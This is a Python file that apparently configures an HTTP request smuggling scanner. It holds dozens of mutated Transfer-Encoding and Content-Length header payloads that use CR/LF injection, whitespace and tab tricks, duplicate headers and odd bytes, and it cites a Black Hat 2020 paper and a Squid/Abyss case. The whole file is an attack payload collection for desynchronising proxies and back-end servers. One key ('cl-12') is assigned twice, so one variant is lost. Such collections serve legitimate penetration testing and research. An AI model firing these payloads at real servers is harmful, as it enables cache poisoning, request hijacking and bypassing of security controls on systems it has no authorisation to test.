### modify te header payload
def render_template_te(gadget):
	RN = "\r\n"
	p = Payload()
	p.header  = "__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.1" + RN
	p.header += gadget + RN
	p.header += "Host: __HOST__" + RN
	p.header += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36" + RN
	p.header += "Content-type: application/x-www-form-urlencoded; charset=UTF-8" + RN
	p.header += "Content-Length: __REPLACE_CL__" + RN
	return p

mutations["space1"] = render_template_te("Transfer-Encoding : chunked")
mutations["nameprefix1"] = render_template_te(" Transfer-Encoding: chunked")
mutations["tabprefix1"] = render_template_te("Transfer-Encoding:\tchunked")
mutations["tabprefix2"] = render_template_te("Transfer-Encoding\t:\tchunked")
mutations["spacejoin1"] = render_template_te("Transfer Encoding: chunked")
mutations["underjoin1"] = render_template_te("Transfer_Encoding: chunked")
mutations["smashed"] = render_template_te("Transfer Encoding:chunked")
mutations["valueprefix1"] = render_template_te("Transfer-Encoding:  chunked")
mutations["vertprefix1"] = render_template_te("Transfer-Encoding:\u000Bchunked")
mutations["commaCow"] = render_template_te("Transfer-Encoding: chunked, cow")
mutations["cowComma"] = render_template_te("Transfer-Encoding: cow, chunked")
mutations["contentEnc"] = render_template_te("Content-Encoding: chunked")
mutations["linewrapped1"] = render_template_te("Transfer-Encoding:\n chunked")
mutations["quoted"] = render_template_te("Transfer-Encoding: \"chunked\"")
mutations["aposed"] = render_template_te("Transfer-Encoding: 'chunked'")
mutations["lazygrep"] = render_template_te("Transfer-Encoding: chunk")
mutations["sarcasm"] = render_template_te("TrAnSFer-EnCODinG: cHuNkeD")
mutations["yelling"] = render_template_te("TRANSFER-ENCODING: CHUNKED")
mutations["0dsuffix"] = render_template_te("Transfer-Encoding: chunked\r")
mutations["tabsuffix"] = render_template_te("Transfer-Encoding: chunked\t")
mutations["revdualchunk"] = render_template_te("Transfer-Encoding: cow\r\nTransfer-Encoding: chunked")
mutations["0dspam"] = render_template_te("Transfer\r-Encoding: chunked")
mutations["nested"] = render_template_te("Transfer-Encoding: cow chunked bar")
mutations["spaceFF"] = render_template_te("Transfer-Encoding:\xFFchunked")
mutations["accentCH"] = render_template_te("Transfer-Encoding: ch\x96nked")
mutations["accentTE"] = render_template_te("Transf\x82r-Encoding: chunked")
mutations["x-rout"] = render_template_te("X:X\rTransfer-Encoding: chunked")
mutations["x-nout"] = render_template_te("X:X\nTransfer-Encoding: chunked")

# for i in [0x1,0x4,0x8,0x9,0xa,0xb,0xc,0xd,0x1F,0x20,0x7f,0xA0,0xFF]:
for i in [0xa,0xd,0x20,0x09]:
	mutations["midspace-%02x"%i] = render_template_te("Transfer-Encoding:%cchunked"%(i))
	mutations["postspace-%02x"%i] = render_template_te("Transfer-Encoding%c: chunked"%(i))
	mutations["prespace-%02x"%i] = render_template_te("%cTransfer-Encoding: chunked"%(i))
	mutations["endspace-%02x"%i] = render_template_te("Transfer-Encoding: chunked%c"%(i))
	mutations["xprespace-%02x"%i] = render_template_te("X: X%cTransfer-Encoding: chunked"%(i))
	mutations["endspacex-%02x"%i] = render_template_te("Transfer-Encoding: chunked%cX: X"%(i))
	mutations["rxprespace-%02x"%i] = render_template_te("X: X\r%cTransfer-Encoding: chunked"%(i))
	mutations["xnprespace-%02x"%i] = render_template_te("X: X%c\nTransfer-Encoding: chunked"%(i))
	mutations["endspacerx-%02x"%i] = render_template_te("Transfer-Encoding: chunked\r%cX: X"%(i))
	mutations["endspacexn-%02x"%i] = render_template_te("Transfer-Encoding: chunked%c\nX: X"%(i))
	
# modify content-length header payload
def render_template_cl(gadget):
	RN = "\r\n"
	p = Payload()
	p.header  = "__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.1" + RN
	p.header += "Host: __HOST__" + RN
	p.header += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36" + RN
	p.header += "Content-type: application/x-www-form-urlencoded; charset=UTF-8" + RN
	p.header += "Content-Length: __REPLACE_CL__" + RN
	p.header += gadget + RN
	return p

mutations["cl-0"] = render_template_cl("Content-Length: 999")
mutations["cl-1"] = render_template_cl("\rContent-Length: 999")
mutations["cl-2"] = render_template_cl("\rContent-Length:999")
mutations["cl-3"] = render_template_cl(" Content-Length: 999")
mutations["cl-4"] = render_template_cl("\nContent-Length: 999")
mutations["cl-5"] = render_template_cl("Content_Length : 999")
mutations["cl-6"] = render_template_cl("Content-Length\r: 999")
mutations["cl-7"] = render_template_cl("Content\r-Length: 999")
mutations["cl-8"] = render_template_cl("Content-Length\n: 999")
mutations["cl-9"] = render_template_cl("Content-Length\t: 999")
mutations["cl-10"] = render_template_cl("Content-Length\t:\t999")
mutations["cl-11"] = render_template_cl("Content-Length:\t999")
mutations["cl-12"] = render_template_cl("Content-Length:\r999")
mutations["cl-12"] = render_template_cl("Content-Length:\n999")
mutations["cl-14"] = render_template_cl("Content-Length:\n 999")
mutations["cl-15"] = render_template_cl("Content-Length: 999\r")
mutations["cl-16"] = render_template_cl("Content-Length: 999\t")

### https://i.blackhat.com/USA-20/Wednesday/us-20-Klein-HTTP-Request-Smuggling-In-2020-New-Variants-New-Defenses-And-New-Challenges.pdf
def render_template_ig_ct(gadget):
	RN = "\r\n"
	p = Payload()
	p.header  = "__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.1" + RN
	p.header += "Host: __HOST__" + RN
	p.header += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36" + RN
	p.header += "Content-Type: text/plain" + RN
	p.header += "Content-Length: __REPLACE_CL__" + RN
	p.header += gadget + RN
	return p

def render_template_cr_cl(gadget):
	RN = "\r\n"
	p = Payload()
	p.header  = "__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.1" + RN
	p.header += "Host: __HOST__" + RN
	p.header += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36" + RN
	p.header += "Content-type: application/x-www-form-urlencoded; charset=UTF-8" + RN
	p.header += gadget + RN
	return p

### Squid in front of Abyss
mutations["SP/CR_junk"] = render_template_cl("Content-Length abcde: 999")
mutations["IG_CT"] = render_template_ig_ct("Content-Length abcde: 999")
mutations["CR_CL"] = render_template_cr_cl("\rContent-Length: 999")
